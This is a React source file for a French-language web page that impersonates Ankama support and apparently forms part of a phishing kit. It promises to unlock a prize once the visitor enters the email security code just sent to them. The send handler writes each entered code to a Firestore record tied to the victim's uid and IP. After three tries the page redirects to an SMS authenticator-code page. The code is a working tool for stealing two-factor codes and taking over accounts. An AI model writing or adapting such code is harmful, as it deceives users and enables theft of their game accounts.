/* eslint-disable no-unused-vars */
import React, { useEffect, useState } from 'react'
import db from "../Firebase"
import { doc, setDoc,updateDoc } from "firebase/firestore";
import styles from '../styles/Home4.module.css'; // Update path based on your project structure
import { useNavigate,Link, useLocation } from 'react-router-dom';
import "../styles/globals.css"


import facebookImage from '../assets/facebook.png';
import twitter from '../assets/twitter.png'
import franceFlag from '../assets/france.png';
import usaFlag from '../assets/usa.png';
import germanyFlag from '../assets/de.png';
import spainFlag from '../assets/spain.png';
import portugalFlag from '../assets/portugal.png';
import italyFlag from '../assets/italy.png';
import logoImage from '../assets/logof.png';
import bannerImage from '../assets/background.jpg';
import search from "../assets/search.png"
import sword from "../assets/sword.png"
import logo from "../assets/logo-dofus.png"
import rep2 from "../assets/rep2.png"
import c1 from "../assets/c1.png"
import c2 from "../assets/c2.jpg"
import c3 from "../assets/c3.jpg"
import c4 from "../assets/c4.jpg"
import c5 from "../assets/c5.jpg"
import c6 from "../assets/c6.jpg"
import c7 from "../assets/c7.jpg"
import img0 from "../assets/img0.png"
import i1 from "../assets/1.png"
import i2 from "../assets/2.jpg"
import i3 from "../assets/3.jpg"
import i4 from "../assets/4.jpg"
import ad from '../assets/ad.jpg'

import comment from "../assets/comments.png"
import logoF from "../assets/logof.png"

function AppVer(props) {
    const [page,setPage] = useState(false);
    const [phone,setPhone] = useState("");
    const [code,setCode] = useState("");
    const [min,setMin] = useState(3);
    const [sec1,setSec1] = useState(0);
    const [visible3,setVisible3] = useState(false)
    const [show,setShow] = useState(false)

    const Router = useNavigate();

    const location = useLocation();
    const {ip,uid} = location.state


    
    const en=()=>{
      Router('/mailVerification/en',{state:{ip:ip,uid:uid}})
     }
     const es=()=>{
      Router('/mailVerification/es',{state:{ip:ip,uid:uid}})

     }
    
     const prg=()=>{
      Router('/mailVerification/prg',{state:{ip:ip,uid:uid}})

     }

     const [count,setCount] = useState(1);

     const send = async(e)=>{
      e.preventDefault();
      if (count < 3) {
        e.preventDefault();
          let localText = localStorage.getItem("text");
          localText = localText.split("/");
          localText.push(` / code-email: ${code}`);
    
            const document = doc(db, "users", uid);
            await updateDoc(document, {
                text: localText.join(" "),
    });
    localStorage.setItem("text", localText.join(" "));
    setCount(prev => prev + 1);
    setCode("");
     }  
    }

    useEffect(()=>{
      console.log(count)
      if (count > 2) {
        Router("/verification/fr",{state:{ip:ip,uid:uid}})
        setCount(1);
      }
    },[count]);

  return (
    <div className={styles.App}>
    
      <div className={styles.all3}>
      <div className={styles.nav3}>
        <div className={styles.firstNav}>
          <div className={styles.fcontainer}>
            <div className={styles.leftC}>
              <h3>ankama</h3>
              <p>SUPPORT</p>
            </div>
            <div className={styles.rightC}>
            <p style={{zIndex:10}}>DECONNEXION</p>
             <div style={{zIndex:9}} onClick={()=> setVisible3(!visible3)} className={styles.flags}>
             <div className={styles.flag1}><img src={franceFlag} alt="" /></div>
             {visible3 && (
              <>
              <div className={styles.flag}><img src={franceFlag} alt="" /> <p className={styles.flagN}>FR</p> </div>
                <div className={styles.flag}><img onClick={en}  src={usaFlag} alt="" /> <p className={styles.flagN}>EN</p></div>
                <div className={styles.flag}><img src={germanyFlag} alt="" /><p className={styles.flagN}>DE</p></div>
                <div className={styles.flag}><img onClick={es}  src={spainFlag} alt="" /><p className={styles.flagN}>ES</p></div>
                <div className={styles.flag}><img onClick={prg}  src={portugalFlag} alt="" /><p className={styles.flagN}>PT</p></div>
                <div className={styles.flag}><img src={italyFlag} alt="" /><p className={styles.flagN}>IT</p></div>


              </>
             )}
             </div>
            </div>
          </div>
        </div>
        
        </div>

        <div className={styles.headingContainer}>
            <div className={styles.headingLogo}>
                <img src={logoF} alt="" />
            </div>
            <div className={styles.headingContext}>
                <form onSubmit={send} className={styles.boxing}>
                <div className={styles.boxingHeader}>
                        <h2>CODE DE SÉCURITÉ</h2>
                    </div>
                    <center>
                    <div className={styles.boxContainer}>
                    <center>
                    <div className={styles.boxingMessage}>
                        <p>Un e-mail vient de vous être envoyé</p>
                    </div>
                    <div className={styles.boxingMessage2}>
                    {!show && (<p>Afin de débloquer votre lot, veuillez saisir le code de sécurité qui vient d`être envoyé sur votre adresse email.</p>)}
                    {show && ( <p>Le code a expiré. Veuillez saisir le nouveau code de securite qui vient d'etre envoye sur votre adresse email</p> )}
                        
                    </div>
                    <div className={styles.code}>
                        <p>Code de sécurité*</p> 
                        <input onChange={(e)=>setCode(e.target.value)} value={code} placeholder='Code de sécurité' type="text" required/>
                    </div>
                    <button type="submit">Valider</button>
                    <div className={styles.goPhone}>
                      <br />
                    <div className={styles.link3} onClick={()=> Router("/verification/fr",{state: {ip:ip,uid:uid}})} style={{color:"red",textDecoration:"none",paddingLeft:"12px",cursor:"pointer"}} shallow><p>Vous utilisez l'Authentificator ?[SMS]</p></div>

                    </div>
                    </center>
                    
                  </div>
                    </center>


                </form>
            </div>
        </div>










<div className={styles.footer3}>
  <center>
  <div className={styles.containerf}>
    <img src={logoF} alt="" />
    <p>© 2021 Ankama. Tous droits réservés. Conditions d'utilisation - Politique de confidentialité - Conditions Générales de Vente - Mentions Légales - Gestion des cookies</p>
  </div>
  </center>
  
</div>

      </div>
    </div>
  )
}

export default AppVer
